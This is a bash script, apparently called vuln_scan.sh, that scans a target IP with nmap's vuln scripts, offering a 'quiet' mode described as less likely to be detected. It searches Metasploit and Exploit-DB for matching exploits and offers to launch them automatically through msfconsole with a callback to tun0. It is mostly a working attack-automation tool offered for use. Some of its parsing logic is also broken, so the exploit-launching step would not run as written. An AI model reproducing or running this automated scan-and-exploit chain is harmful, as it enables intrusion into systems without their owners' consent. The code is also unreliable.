#!/bin/bash
export TERM=dumb

# Update apt and install dependencies
sudo apt update
sudo apt install -y $(cat dependencies.txt)

# Check for missing public keys and retrieve them
missing_key=$(sudo apt-key list | grep -B 1 -A 1 "NO_PUBKEY" | sed -n 's/.*NO_PUBKEY //p' | uniq)
if [[ -n "$missing_key" ]]; then
    for key in $missing_key; do
        sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys "$key"
    done
fi

tput reset

echo -e "\033[31m

 ██▒   █▓ █    ██  ██▓     ███▄    █    ▓█████ ▒██   ██▒▓█████  ▄████▄  
▓██░   █▒ ██  ▓██▒▓██▒     ██ ▀█   █    ▓█   ▀ ▒▒ █ █ ▒░▓█   ▀ ▒██▀ ▀█  
 ▓██  █▒░▓██  ▒██░▒██░    ▓██  ▀█ ██▒   ▒███   ░░  █   ░▒███   ▒▓█    ▄ 
  ▒██ █░░▓▓█  ░██░▒██░    ▓██▒  ▐▌██▒   ▒▓█  ▄  ░ █ █ ▒ ▒▓█  ▄ ▒▓▓▄ ▄██▒
   ▒▀█░  ▒▒█████▓ ░██████▒▒██░   ▓██░   ░▒████▒▒██▒ ▒██▒░▒████▒▒ ▓███▀ ░
   ░ ▐░  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░   ▒ ▒    ░░ ▒░ ░▒▒ ░ ░▓ ░░░ ▒░ ░░ ░▒ ▒  ░
   ░ ░░  ░░▒░ ░ ░ ░ ░ ▒  ░░ ░░   ░ ▒░    ░ ░  ░░░   ░▒ ░ ░ ░  ░  ░  ▒   
     ░░   ░░░ ░ ░   ░ ░      ░   ░ ░       ░    ░    ░     ░   ░        
      ░     ░         ░  ░         ░       ░  ░ ░    ░     ░  ░░ ░      
     ░                                                         ░        
\033[0m"

# Check if user has necessary permissions
if [ "$EUID" -ne 0 ]
then 
    echo "Please run as root"
    exit
fi

# Parse command line arguments
while [[ $# -gt 0 ]]
do
key="$1"

case $key in
    -i|--ip)
    IP="$2"
    shift
    shift
    ;;
    -l|--loud)
    lq="l"
    shift
    ;;
    -q|--quiet)
    lq="q"
    shift
    ;;
    -h|--help)
    help="true"
    shift
    ;;
    *)    # unknown option
    echo "Invalid option: $key"
    help="true"
    shift
    ;;
esac
done

# Show help message if -h or invalid command is entered
if [[ "$help" == "true" || -z "$IP" ]]
then
    echo "Usage: ./vuln_scan.sh [-i IP_ADDRESS] [-l|-q] [-h]"
    echo "-i | --ip       : IP address of target to scan (required)"
    echo "-l | --loud     : Perform loud scan (more aggressive, more likely to be detected)"
    echo "-q | --quiet    : Perform quiet scan (less aggressive, less likely to be detected)"
    echo "-h | --help     : Display this help message"
    exit
fi

# Prompt user for input if loud/quiet scan option not provided as an argument
if [[ -z "$lq" ]]
then
    read -p "Loud or quiet scan (l/q)? " lq < /dev/tty
fi

# Validate user input
if [[ ! $IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]
then
    echo "Invalid IP address"
    exit
fi

if [[ ! $lq =~ ^[lq]$ ]]
then
    echo "Invalid input"
    exit
fi

# Scan for vulnerabilities using Nmap
echo "Scanning for vulnerabilities..."
if [ $lq = "l" ]
then
    vulnScanResult=$(nmap -sV -sS --script vuln -T5 -oG nmap-scan.txt $IP)
else
    vulnScanResult=$(nmap -sV -sS --script vuln -T1 -oG nmap-scan.txt $IP)
fi

# Check if there are any open ports
if [ -z "$(grep 'Ports\|open' nmap-scan.txt)" ]
then
    echo "No open ports found"
    exit
fi

# Show brief output of vuln script results
echo "Vulnerability scan results:"
grep -oP 'CVE-\d{4}-\d{4}\|MS\d{2}-\d{3}' nmap-scan.txt | sort -u

# Search for exploits in multiple databases
echo "Searching for exploits..."
echo "Metasploit Framework:"
exploitsFound=false
total_ports=$(grep -oP '(?<=Ports: ).*(?=\))' nmap-scan.txt | sed 's/ /\'$'\n/g' | sed 's/,//g' | wc -l)
count=0
while read -r port state
do
    # Update the progress bar
    count=$((count+1))
    progress=$(echo "scale=2; $count/$total_ports" | bc -l)
    echo -ne "Progress: [$count/$total_ports] ($progress%)\r"

    # Search in Metasploit Framework
    echo "Searching in Metasploit Framework:"
    searchResults=$(msfconsole -q -x "search $port" < /dev/null)
    if [ -n "$searchResults" ]
    then
        echo "$searchResults" | awk -v pattern="($port)" 'BEGIN { FS="|" } /exploits/ && ( $0 ~ pattern ) { printf "\033[41m%s\033[0m\n", $2; exploitsFound=true }'
    fi

    # Search in other databases (e.g. Exploit-DB)
    echo "Searching in Exploit-DB:"
    searchResults=$(searchsploit --colour -t $port $(grep -oP '(?<=^\|\s)\w+' nmap-scan.txt | tr '\n' ',' | sed 's/,$//'))
    if [ -n "$searchResults" ]
    then
        echo "$searchResults"
        exploitsFound=true
    fi

    # Update progress bar
    percentage=$((count*100/total_ports))
    printf "["
    for ((i=0; i<percentage; i+=2)); do printf "#"; done
    for ((i=percentage; i<100; i+=2)); do printf " "; done
    printf "] $percentage%%\r"

    ((current_port++))
done <<< "$(grep -oP '(?<=Ports: ).*(?=\))' nmap-scan.txt | sed 's/ /\'$'\n/g' | sed 's/,//g')"

if [ $exploitsFound = false ]
then
    echo "No exploits found"
    exit
fi

# Execute discovered exploits (use with caution and proper authorization!)
read -p "Would you like to execute discovered exploits (y/n)? " executeExploits
if [[ $executeExploits =~ ^[yY]$ ]]; then
    while read -r line
    do
        exploitPath=$(echo "$line" | cut -d ":" -f 1)
        exploitName=$(echo "$line" | cut -d ":" -f 2)
        echo "Executing $exploitName..."
        msfconsole -x "use $(echo $exploitPath | cut -d "/" -f 7); set RHOSTS $IP; set LHOST tun0; exploit; exit;"
    done <<< "$(grep -H -i -e 'CVE-\S\+\|MS\d\+-\S\+' nmap-scan.txt)"
fi

